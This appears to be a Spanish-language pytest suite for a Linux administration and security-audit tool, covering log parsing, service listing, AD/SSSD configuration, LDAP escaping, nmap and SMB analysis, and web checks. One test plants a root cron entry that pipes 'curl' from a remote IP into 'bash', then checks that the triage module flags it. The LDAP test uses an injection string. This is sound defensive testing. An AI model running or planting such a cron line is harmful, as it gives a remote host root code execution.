"""Pruebas del núcleo."""
import subprocess
import os

import pytest

from opsdeck.core import accounts, packages, system


def dpkg_state():
    return subprocess.run(["dpkg-query", "-W", "-f=${Package} ${Status}\n"], capture_output=True, text=True).stdout


@pytest.mark.skipif(packages.manager().name != "apt", reason="solo apt")
def test_plan_no_instala_nada():
    pm = packages.manager()
    candidate = "cowsay" if not pm.is_installed("cowsay") else "sl"
    before = dpkg_state()
    plan = pm.plan([candidate])
    assert dpkg_state() == before, "preparar el plan ha modificado los paquetes instalados"
    assert candidate in plan.to_install or candidate in plan.unavailable
    assert not pm.is_installed(candidate)


def test_password_generada_cumple_politica():
    for _ in range(50):
        p = accounts.gen_password(16)
        assert len(p) == 16 and not accounts.password_problem(p)


def test_nombres():
    assert accounts.valid_name("jperez") and accounts.valid_name("_svc-1")
    assert not accounts.valid_name("Mal:Nombre") and not accounts.valid_name("1abc") and not accounts.valid_name("")


def test_familia_detectada():
    assert system.os_family() in ("debian", "rhel", "suse", "arch", "desconocida")


def test_detener_proceso_largo():
    import threading
    import time as _t
    out = []
    th = threading.Thread(target=lambda: out.append(system.stream(["sleep", "30"], lambda l: None)))
    t0 = _t.time()
    th.start()
    _t.sleep(0.5)
    assert system.stop_current()
    th.join(5)
    assert not th.is_alive() and _t.time() - t0 < 5
    assert out[0] != 0


JOURNAL_REAL = [  # líneas con el formato real del journal (datos ficticios)
    ("nov 16 16:14:50", "pam_unix(xrdp-sesman:account): expired password for user usuario1 (root enforced)"),
    ("nov 16 16:15:16", "password check failed for user (usuario2)"),
    ("nov 16 16:15:16", "pam_unix(xrdp-sesman:auth): authentication failure; logname= uid=0 euid=0 tty=xrdp-sesman ruser= rhost=::ffff:192.168.0.254  user=usuario2"),
    ("nov 16 16:15:19", "[INFO ] AUTHFAIL: user=usuario2 ip=::ffff:192.168.0.254 time=1794842119"),
    ("nov 16 17:00:00", "Failed password for invalid user admin from 203.0.113.9 port 51234 ssh2"),
    ("nov 16 17:00:01", "Failed password for root from 203.0.113.9 port 51235 ssh2"),
    ("nov 16 17:05:00", "Accepted publickey for admin1 from 192.168.0.254 port 50000 ssh2: ED25519 SHA256:x"),
]


def test_registros_detecta_fallos_y_accesos():
    from opsdeck.modules import registros
    fails = registros.parse_failures(JOURNAL_REAL)
    users = [f["usuario"] for f in fails]
    assert users.count("usuario2") == 2          # PAM + AUTHFAIL (unix_chkpwd no lleva IP)
    assert "admin" in users and "root" in users
    assert {f["ip"] for f in fails} >= {"192.168.0.254", "203.0.113.9"}
    logins = registros.parse_logins(JOURNAL_REAL)
    assert logins == [{"fecha": "nov 16 17:05:00", "usuario": "admin1", "ip": "192.168.0.254", "metodo": "publickey"}]


def test_sudo_regex():
    from opsdeck.modules.registros import SUDO
    m = SUDO.search("admin1 : TTY=pts/0 ; PWD=/home/admin1 ; USER=root ; COMMAND=/usr/bin/apt update")
    assert m and m.group("user") == "admin1" and m.group("as") == "root" and m.group("cmd") == "/usr/bin/apt update"


class _FakeOut:
    def __init__(self):
        self.lines, self.tables = [], []
    def info(self, m): self.lines.append(m)
    ok = warn = error = line = title = info
    def table(self, h, rows): self.tables.append((h, rows))
    def secret(self, *a): pass
    def check(self, g, m): self.lines.append(m)


SYSTEMCTL = {
    ("list-units", "--state=running"): "ssh.service loaded active running OpenBSD Secure Shell server\n"
                                         "xrdp.service loaded active running xrdp daemon\n",
    ("list-units", "--all"): "ssh.service loaded active running OpenBSD Secure Shell server\n"
                             "smbd.service loaded failed failed Samba SMB Daemon\n",
    ("list-timers",): "Tue 2026-11-17 00:00:00 CET 6h left Mon 2026-11-16 00:00:00 CET 17h ago logrotate.timer logrotate.service\n"
                      "- - Mon 2026-11-16 09:00:00 CET 8h ago apt-daily.timer apt-daily.service\n",
}


def test_servicios_interpreta_systemctl(monkeypatch):
    from opsdeck.core import catalog, system as sysmod
    from opsdeck.modules import servicios

    def fake_run(cmd, **kw):
        for key, out in SYSTEMCTL.items():
            if all(k in cmd for k in key):
                return sysmod.Result(0, out, "")
        return sysmod.Result(0, "", "")
    monkeypatch.setattr(servicios.system, "run", fake_run)
    out = _FakeOut()
    servicios.listar(catalog.Context(out), {"filtro": "activos"})
    assert [r[0] for r in out.tables[0][1]] == ["ssh", "xrdp"]
    out = _FakeOut()
    servicios.resumen(catalog.Context(out), {})
    assert ["Con fallos", "1"] in out.tables[0][1]
    out = _FakeOut()
    servicios.timers(catalog.Context(out), {})
    names = [r[0] for r in out.tables[0][1]]
    assert names == ["logrotate", "apt-daily"]
    assert servicios._confirm_stop({"servicio": "ssh"}).count("PERDERÁS LA CONEXIÓN") == 1


REALM_LIST = """prueba.local
  type: kerberos
  realm-name: PRUEBA.LOCAL
  domain-name: prueba.local
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  login-formats: %U
  login-policy: allow-permitted-logins
  permitted-logins: jperez@prueba.local
  permitted-groups: IT, Acceso Linux
"""

SSSD = """[sssd]
domains = prueba.local
services = nss, pam

[domain/prueba.local]
ad_domain = prueba.local
use_fully_qualified_names = True
fallback_homedir = /home/%u@%d
"""


def test_dominio_realm_list_y_sudoers(monkeypatch, tmp_path):
    from opsdeck.core import system as sysmod
    from opsdeck.modules import dominio
    monkeypatch.setattr(dominio.system, "run", lambda cmd, **kw: sysmod.Result(0, REALM_LIST, ""))
    d = dominio.joined()
    assert d["nombre"] == "prueba.local" and d["login-policy"] == "allow-permitted-logins"
    assert d["permitted-groups"] == ["IT, Acceso Linux"]
    conf = tmp_path / "sssd.conf"
    conf.write_text(SSSD)
    monkeypatch.setattr(dominio, "SSSD_CONF", conf)
    assert dominio._ad_group_ref("Acceso Linux", "prueba.local") == "%Acceso\\ Linux@prueba.local"
    monkeypatch.setattr(dominio, "apply", lambda *a, **k: True)
    monkeypatch.setattr(dominio.audit, "record", lambda *a, **k: None)
    assert dominio._sssd_short_names(type("C", (), {"out": None})(), "prueba.local")
    text = conf.read_text()
    assert "use_fully_qualified_names = False" in text and "fallback_homedir = /home/%u" in text
    assert text.count("use_fully_qualified_names") == 1 and "[sssd]" in text
    assert dominio._ad_group_ref("Acceso Linux", "prueba.local") == "%Acceso\\ Linux"
    # la regla generada valida con visudo
    import subprocess
    rule = tmp_path / "r"
    rule.write_text("%Acceso\\ Linux@prueba.local ALL=(ALL:ALL) ALL\n")
    if sysmod.has_cmd("visudo"):
        assert subprocess.run(["visudo", "-cf", str(rule)], capture_output=True).returncode == 0


def test_ldap_escape_y_ldif():
    from opsdeck.modules import ldap
    assert ldap.escape("*)(uid=*") == "\\2a\\29\\28uid=\\2a"
    e = ldap.parse_ldif("dn: CN=Jos\\C3\\A9,DC=x\ncn:: Sm9zw6k=\ndescription: linea\n larga\n\ndn: CN=b,DC=x\n")
    assert e[0]["cn"] == ["José"] and e[0]["description"] == ["linealarga"] and len(e) == 2
    assert ldap.filetime_to_date("0") == "nunca" and ldap.filetime_to_date("133000000000000000").startswith("20")
    assert ldap.base_from_domain("empresa.local") == "DC=empresa,DC=local"


def test_lynis_informe(tmp_path):
    from opsdeck.modules.bastionado import parse_report
    rep = tmp_path / "r.dat"
    rep.write_text("hardening_index=67\nlynis_tests_done=248\n"
                   "warning[]=SSH-7408|PermitRootLogin habilitado|-|-|\n"
                   "suggestion[]=AUTH-9230|Configure password hashing rounds|-|-|\n"
                   "suggestion[]=FIRE-4513|Check iptables rules|rules unused|-|\n")
    d = parse_report(rep)
    assert d["hardening_index"] == "67" and len(d["warning"]) == 1 and len(d["suggestion"]) == 2
    assert d["warning"][0]["id"] == "SSH-7408" and d["suggestion"][1]["detalle"] == "rules unused"


def test_revision_no_falla_y_ids_estables():
    from opsdeck.modules.revision import run_review
    a, b = run_review(), run_review()
    assert [i["id"] for i in a.items] == [i["id"] for i in b.items]
    assert all(i["nivel"] in ("ALTO", "MEDIO", "BAJO") for i in a.items)


@pytest.mark.skipif(os.geteuid() != 0, reason="escribe en /etc/cron.d: requiere root")
def test_triaje_persistencia_detecta_cron_sospechoso(tmp_path, monkeypatch):
    from pathlib import Path as P
    from opsdeck.modules import triaje
    cron = P("/etc/cron.d/opsdeck_test_cron")
    cron.write_text("*/5 * * * * root curl -s http://203.0.113.9/x | bash\n")
    try:
        rows = triaje.persistence(7)
        hit = [r for r in rows if r[1] == str(cron)]
        assert hit and hit[0][4] == "!"
    finally:
        cron.unlink()


def test_nmap_xml_real_y_diff(tmp_path):
    from pathlib import Path as P
    from opsdeck.core import nmapxml
    scan = nmapxml.parse(P(__file__).parent / "datos" / "nmap_dc.xml")
    h = scan.up()[0]
    ports = {p.port for p in h.open_ports()}
    assert {88, 389, 445, 636} <= ports
    assert next(p for p in h.open_ports() if p.port == 636).is_tls
    # diff: quitar un puerto y añadir un equipo
    import copy
    new = copy.deepcopy(scan)
    new.hosts[0].ports = [p for p in new.hosts[0].ports if p.port != 445]
    new.hosts.append(nmapxml.Host(ip="10.0.0.9", ports=[nmapxml.Port(22, "tcp", "open", "ssh")]))
    d = nmapxml.diff(scan, new)
    assert d["hosts_nuevos"] == ["10.0.0.9"]
    assert ("127.0.0.1", "445/netbios-ssn") in d["puertos_cerrados"] or any(x[1].startswith("445/") for x in d["puertos_cerrados"])


def test_smb_interpreta_scripts():
    from opsdeck.core.nmapxml import Host, Port
    from opsdeck.modules.smb import analyze_host
    h = Host(ip="192.168.0.11", ports=[Port(445, "tcp", "open", "microsoft-ds")],
             scripts={"smb-protocols": "dialects: \n  NT LM 0.12 (SMBv1) [dangerous, but default]\n  2:1:0",
                      "smb2-security-mode": "3:1:1: \n  Message signing enabled but not required",
                      "smb-os-discovery": "OS: Windows Server 2016 Standard 14393\nComputer name: SRVDATOS01"})
    r = analyze_host(h)
    assert r["smbv1"] and r["firma"] == "NO requerida" and r["nombre"] == "SRVDATOS01" and "2016" in r["so"]
    h.scripts = {"smb2-security-mode": "3:1:1: \n  Message signing enabled and required"}
    r = analyze_host(h)
    assert not r["smbv1"] and r["firma"] == "requerida"


def test_web_detecta_problemas(monkeypatch):
    from opsdeck.modules import web
    monkeypatch.setattr(web, "headers", lambda url: {"estado": 200, "url": url,
                                                     "cabeceras": {"server": "Apache/2.4.41", "x-frame-options": "DENY"}})
    monkeypatch.setattr(web, "tls_info", lambda h, p: {"versiones": ["TLS 1.0", "TLS 1.2"], "dias": -3,
                                                       "caduca": "2026-11-13", "confianza": "válido y de confianza"})
    monkeypatch.setattr(web, "request", lambda *a, **k: {"estado": 405, "cabeceras": {}, "cuerpo": b""})
    r = web.check_url("https://intranet.local")
    levels = {lvl for lvl, _ in r["hallazgos"]}
    texts = " ".join(t for _, t in r["hallazgos"])
    assert "ALTO" in levels and "CADUCADO" in texts and "TLS 1.0" in texts and "Apache/2.4.41" in texts


def test_ediciones(monkeypatch):
    from opsdeck.core import catalog, edition
    from opsdeck.core.config import settings
    cfg = settings()
    prev = cfg.get("general", "edicion")
    try:
        cfg.set("general", "edicion", "ligera")
        mods = {m.id: m.status().state for m in catalog.all_modules()}
        assert mods["trafico"] == catalog.UNAVAILABLE and mods["triaje"] == catalog.UNAVAILABLE
        assert mods["usuarios"] == catalog.AVAILABLE and mods["revision"] == catalog.AVAILABLE
        esc = catalog.module("escaneo")
        assert esc.action("personalizado") and not esc.action("personalizado").available()
        perfiles = [c[0] for c in next(p for p in esc.action("escanear").params if p.name == "perfil").choices]
        assert perfiles == ["rapido", "estandar"]
        cfg.set("general", "edicion", "completa")
        monkeypatch.setattr(edition.system, "operator", lambda: "root")
        assert edition.allowed_full() == (True, "")
        assert catalog.module("triaje").status().state == catalog.AVAILABLE
        monkeypatch.setattr(edition.system, "operator", lambda: "nobody")
        ok, why = edition.allowed_full()
        assert not ok and "Restringido" in why
        assert catalog.module("triaje").status().state == catalog.UNAVAILABLE
    finally:
        cfg.set("general", "edicion", prev)


def test_trafico_resumen():
    from opsdeck.modules.trafico import summarize
    flows = ["18:00:00.1 IP 10.0.0.5.51000 > 10.0.0.2.23: tcp 0",
             "18:00:00.2 IP 10.0.0.2.23 > 10.0.0.5.51000: tcp 12",
             "18:00:00.3 IP 10.0.0.5.40000 > 10.0.0.9.443: tcp 0",
             "18:00:00.4 IP 10.0.0.5 > 10.0.0.1: ICMP echo request, id 1, seq 1, length 64",
             "18:00:00.5 IP6 fe80::1.546 > ff02::1:2.547: UDP, length 60"]
    dns = ["18:00:01.0 IP 10.0.0.5.5353 > 10.0.0.1.53: 1234+ A? intranet.ejemplo.local. (40)"]
    arp = ["18:00:02.0 aa:aa:aa:aa:aa:01 > ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 42: Request who-has 10.0.0.1 tell 10.0.0.5, length 28",
           "18:00:02.1 aa:aa:aa:aa:aa:02 > aa:aa:aa:aa:aa:01, ethertype ARP (0x0806), length 42: Reply 10.0.0.1 is-at aa:aa:aa:aa:aa:02, length 28",
           "18:00:02.2 aa:aa:aa:aa:aa:03 > aa:aa:aa:aa:aa:01, ethertype ARP (0x0806), length 42: Reply 10.0.0.1 is-at aa:aa:aa:aa:aa:03, length 28"]
    s = summarize(flows, dns, arp)
    assert s["talkers"]["10.0.0.5"] == 3
    assert s["sin_cifrar"]["Telnet"]["10.0.0.5 → 10.0.0.2"] == 2
    assert s["dns"]["intranet.ejemplo.local"] == 1
    assert len(s["macs"]["10.0.0.1"]) == 2 and s["macs"]["10.0.0.5"] == {"aa:aa:aa:aa:aa:01"}


def test_sssd_set_crea_seccion(monkeypatch, tmp_path):
    from opsdeck.modules import dominio
    conf = tmp_path / "sssd.conf"
    conf.write_text(SSSD)
    monkeypatch.setattr(dominio, "SSSD_CONF", conf)
    assert dominio.sssd_set("domain/prueba.local", {"cache_credentials": "False", "ad_gpo_access_control": "permissive"})
    assert dominio.sssd_set("pam", {"offline_credentials_expiration": "7"}, create=True)
    assert not dominio.sssd_set("domain/otro.local", {"x": "y"})
    assert dominio.sssd_get("domain/prueba.local", "ad_gpo_access_control") == "permissive"
    assert dominio.sssd_get("pam", "offline_credentials_expiration") == "7"
    assert dominio.sssd_get("domain/prueba.local", "ad_domain") == "prueba.local"
    assert oct(conf.stat().st_mode)[-3:] == "600"
